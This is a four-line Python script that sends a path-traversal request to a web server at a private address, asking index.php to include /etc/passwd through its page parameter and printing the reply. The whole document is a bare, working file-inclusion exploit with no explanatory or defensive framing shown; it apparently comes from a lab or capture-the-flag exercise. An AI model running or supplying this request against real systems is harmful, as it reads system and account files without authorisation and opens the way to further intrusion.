import requests

r = requests.get('http://192.168.1.20/index.php?page=../../../../../../../../../../etc/passwd')
print(r.text)
